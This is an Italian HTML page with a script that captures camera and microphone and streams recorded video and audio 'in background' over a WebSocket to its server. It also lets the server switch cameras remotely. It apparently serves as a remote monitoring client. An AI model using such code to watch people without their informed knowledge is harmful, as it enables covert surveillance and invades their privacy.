<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Client Camera + Audio</title>
<style>
body { margin:0; padding:0; background:#000; color:#0f0; font-family:Arial; text-align:center; }
.msg { padding:40px 20px; font-size:18px; }
</style>
</head>
<body>
<div class="msg">Avvio fotocamera...<br><small>Non chiudere questa pagina</small></div>
<video id="cam" autoplay playsinline muted style="display:none;"></video>

<script>
const room = new URLSearchParams(location.search).get('room') || 'user1';
const protocol = location.protocol === 'https:' ? 'wss' : 'ws';
const ws = new WebSocket(`${protocol}://${location.host}/bg-stream?room=${room}`);

let currentCamera = 'environment';
let mediaRecorder;
let stream;

async function startCamera(facing) {
  if (stream) stream.getTracks().forEach(track => track.stop());
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: facing },
      audio: true
    });
    const videoEl = document.getElementById('cam');
    videoEl.srcObject = stream;
    videoEl.style.display = 'block';
    await videoEl.play();

    // MediaRecorder per WebM video+audio
    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp8,opus' });
    mediaRecorder.ondataavailable = e => {
      if (e.data.size > 0 && ws.readyState === WebSocket.OPEN) ws.send(e.data);
    };
    mediaRecorder.start(50); // chunk ogni 50ms (~20 FPS)

    document.querySelector('.msg').innerHTML = `<b>Camera attiva</b><br><small>Video e audio inviati in background.</small>`;
  } catch(err) {
    document.body.innerHTML = `<div class="msg">Errore: ${err.message}</div>`;
  }
}

ws.onopen = () => startCamera(currentCamera);

ws.onmessage = e => {
  if (typeof e.data === 'string') {
    try {
      const msg = JSON.parse(e.data);
      if (msg.type === 'switchCamera') {
        currentCamera = msg.camera;
        startCamera(currentCamera);
      }
    } catch{}
  }
};

// Mantieni alive WS
setInterval(() => { if(ws.readyState===WebSocket.OPEN) ws.send('ping'); },10000);
</script>
</body>
</html>
